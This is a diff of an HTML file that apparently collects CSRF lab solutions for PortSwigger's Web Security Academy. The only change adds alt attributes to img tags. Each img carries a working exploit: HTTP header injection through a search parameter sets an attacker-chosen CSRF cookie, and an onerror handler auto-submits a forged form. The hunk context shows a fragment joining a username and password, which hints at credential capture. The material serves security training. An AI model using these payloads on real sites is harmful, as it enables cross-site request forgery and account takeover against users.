@@ -219,7 +219,7 @@ body:username.value+':'+this.value
       <input type="hidden" name="csrf" value="ZEOD5di4a2aqVeSCN5xFkRMFGaffTqqi" />
       <input type="submit" value="Submit request" />
     </form>
-    <img src="https://0a08000c03827916806b0307005500e8.web-security-academy.net/?search=lol%0d%0aSet-Cookie:%20csrfKey=QSrWs740iyVb1u69HMFIX2BmQGtpYrqL%3b%20SameSite=None" onerror="document.forms[0].submit()">
+    <img src="https://0a08000c03827916806b0307005500e8.web-security-academy.net/?search=lol%0d%0aSet-Cookie:%20csrfKey=QSrWs740iyVb1u69HMFIX2BmQGtpYrqL%3b%20SameSite=None" alt="" onerror="document.forms[0].submit()">
   </body>
 </html>
 <!-- CSRF where token is duplicated in cookie (first need to inject our csrf cookie through http header injection in the searchbar) -->
@@ -232,7 +232,7 @@ body:username.value+':'+this.value
       <input type="submit" value="Submit request" />
     </form>
 
-    <img src="https://0a7e0086038bc2518391aa99007100f1.web-security-academy.net/?search=hi%0d%0aSet-Cookie:%20csrf=lol%3b%20SameSite=None" onerror="document.forms[0].submit()">
+    <img src="https://0a7e0086038bc2518391aa99007100f1.web-security-academy.net/?search=hi%0d%0aSet-Cookie:%20csrf=lol%3b%20SameSite=None" alt="" onerror="document.forms[0].submit()">
   </body>
 </html>
 
